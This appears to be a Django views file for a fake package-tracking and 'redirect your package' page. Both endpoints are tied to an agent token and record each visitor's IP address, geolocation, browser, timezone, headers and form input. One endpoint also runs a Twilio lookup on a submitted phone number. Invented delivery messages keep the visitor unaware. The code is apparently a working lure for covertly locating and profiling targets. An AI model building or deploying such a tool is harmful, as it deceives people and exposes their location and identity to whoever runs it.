import json
from tracking.api.functions import IpData, LocaleData, LocationData, TimeData, UserAgentData, get_ip_data, get_locale_data, get_location_data, get_time_data, get_user_agent_data
from config.common import HeaderData
from config import settings
from tracking.api.api import TwilioApiClient, TwilioLookupResponse
from tracking.models import TrackingData, Agent
from django.http import HttpRequest, JsonResponse, HttpResponse
from django.views.decorators.csrf import csrf_exempt
from django.shortcuts import render, get_object_or_404
from typing import Optional


@csrf_exempt
def track_view(request: HttpRequest, token: Optional[str] = None) -> HttpResponse:
    if token and request.method == 'POST':
        # Add breakpoint for debugging
        agent = get_object_or_404(Agent, token=token)
        headers_data: HeaderData = getattr(request, 'headers_data')
        http_method: str = request.POST.get('http_method', request.method)
                
        # Get IP data
        ip_data: IpData = get_ip_data(request, headers_data)
        print(f"ip data: {ip_data}")
        
        # Get user agent data
        user_agent_data: UserAgentData = get_user_agent_data(request, headers_data)
        
        # Get locale data
        locale_data: LocaleData = get_locale_data(request, headers_data)
        
        # Get time data
        time_data: TimeData = get_time_data(headers_data, ip_data)
        
        # Get location data
        location_data: LocationData = get_location_data(headers_data, ip_data)

        # Create tracking data
        TrackingData.objects.create(
            agent=agent,
            http_method=http_method,
            ip_address=ip_data.getSelectedAddress(),
            ip_source=ip_data.source,
            os=user_agent_data.get_os_name(),
            browser=user_agent_data.get_browser_name(),
            platform=user_agent_data.get_platform_type(),
            locale=locale_data.selected,
            client_time=time_data.info,
            client_timezone=time_data.getTimezone(),
            latitude=location_data.getLatitude(),
            longitude=location_data.getLongitude(),
            location_source=location_data.source,
            tracking_data=headers_data.to_json(),
            ip_data=ip_data.to_json(),
            user_agent_data=user_agent_data.to_json(),
            headers_data=headers_data.to_json(),
            form_data=json.dumps(request.POST, sort_keys=True, ensure_ascii=True)
        )

        return JsonResponse({
            'status': 'success', 
            'message': '✅ Your package was picked up by a local carrier. It may take a few hours to arrive at the sorting facility.'
        })

    # For GET request: serve Django template
    return render(request, 'tracking/track.html', {})


@csrf_exempt
def redirect_package_view(request: HttpRequest, token: Optional[str] = None) -> HttpResponse:
    if token and request.method == 'POST':
        agent = get_object_or_404(Agent, token=token)
        headers_data: HeaderData = getattr(request, 'headers_data')
        http_method = request.POST.get('http_method', request.method)
        notifications = request.POST.get('notifications')
        
        # Get IP data
        ip_data: IpData = get_ip_data(request, headers_data)
        print(f"ip data: {ip_data}")
        
        # Get user agent data
        user_agent_data: UserAgentData = get_user_agent_data(request, headers_data)
        
        # Get locale data
        locale_data: LocaleData = get_locale_data(request, headers_data)
        
        # Get time data
        time_data: TimeData = get_time_data(headers_data, ip_data)
        
        # Get location data
        location_data: LocationData = get_location_data(headers_data, ip_data)


        # Handle notifications if provided
        phone_data: Optional[TwilioLookupResponse] = None
        if notifications:
            twilio_client = TwilioApiClient(settings.TWILIO_ACCOUNT_SID, settings.TWILIO_AUTH_TOKEN)
            phone_data = twilio_client.get_data(notifications)

        # Create tracking data
        TrackingData.objects.create(
            agent=agent,
            http_method=http_method,
            ip_address=ip_data.selected,
            ip_source=ip_data.source,
            os=user_agent_data.get_os_name(),
            browser=user_agent_data.get_browser_name(),
            platform=user_agent_data.get_platform_type(),
            locale=locale_data.selected,
            client_time=time_data.info,
            client_timezone=time_data.getTimezone(),
            latitude=location_data.getLatitude(),
            longitude=location_data.getLongitude(),
            location_source=location_data.source,
            tracking_data=headers_data.to_json(),
            ip_data=ip_data.to_json(),
            user_agent_data=user_agent_data.to_json(),
            headers_data=headers_data.to_json(),
            form_data=json.dumps(request.POST, sort_keys=True, ensure_ascii=True),
            phone_data=json.dumps(phone_data.model_dump() if phone_data else None, sort_keys=True, ensure_ascii=True)
        )

        return JsonResponse({
            'status': 'success', 
            'message': '✅ A request was sent to redirect your package. Please check your phone for updates we have sent you.'
        })

    return render(request, 'tracking/redirect.html', {})
